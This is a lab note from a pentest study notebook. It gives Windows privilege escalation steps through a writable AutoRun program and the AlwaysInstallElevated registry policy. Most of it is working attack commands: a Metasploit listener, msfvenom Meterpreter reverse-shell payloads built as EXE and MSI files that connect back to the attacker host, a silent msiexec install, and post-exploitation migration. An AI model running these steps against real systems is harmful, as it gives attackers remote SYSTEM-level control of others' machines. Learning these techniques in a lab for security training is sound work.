---
title: Registry Attacks / AutoRun/Always Install Elevated
updated: 2023-11-03 08:17:04Z
created: 2023-10-03 02:12:05Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# Registry Attacks

# Startup Applications

Check for applications in AutoRun folder  
`reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

reg query HKEY\_CURRENT\_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

## Detection

**Windows VM**

1.  Open command prompt and type: `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`
2.  In Autoruns, click on the ‘Logon’ tab.
3.  From the listed results, notice that the “My Program” entry is pointing to “C:\\Program Files\\Autorun Program\\program.exe”.
4.  In command prompt type: `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`
5.  From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.

## Exploitation

**Kali VM**

1.  `msfconsole`
2.  `use multi/handler`
3.  `set payload windows/meterpreter/reverse_tcp`
4.  `set lhost [Kali VM IP Address]`
5.  `run`  
    Create payload:
6.  `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`
7.  Copy the generated file, program.exe, to the target machine.

**Windows target**

1.  Place program.exe in ‘C:\\Program Files\\Autorun Program’.
2.  To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

**Kali VM**

1.  Wait for a new session to open in Metasploit.
2.  In Metasploit (msf > prompt) type: sessions -i \[Session ID\]
3.  To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

* * *

# Always Install Elevated

1.  `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
2.  `reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
3.  Check if “**AlwaysInstallElevated**” value is **0x1**.
4.  Check permissions on key

## Exploitation

**Kali VM**

1.  `msfconsole`
2.  `use multi/handler`
3.  `set payload windows/meterpreter/reverse_tcp`
4.  `set lhost [Kali VM IP Address]`
5.  `run`  
    Create payload:
6.  `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi`
7.  Copy the generated file, **setup.msi**, to the Windows target.

**Windows VM**

1.Place ‘**setup.msi**’ in ‘**C:\\Temp**’.  
2.cmd> **msiexec /quiet /qn /i C:\\Temp\\setup.msi**

* * *
# Meterpreter
1. Establish initial session with Meterpreter
2. `run post/multi/recon/local_exploit_suggester`
3. `use exploit/windows/local/always_installed_elevated`
4. `exploit -j`
5. If nessary, migrate to a system level "1" process
6. Locate process using `ps` , then `migrate <psid>`
7. 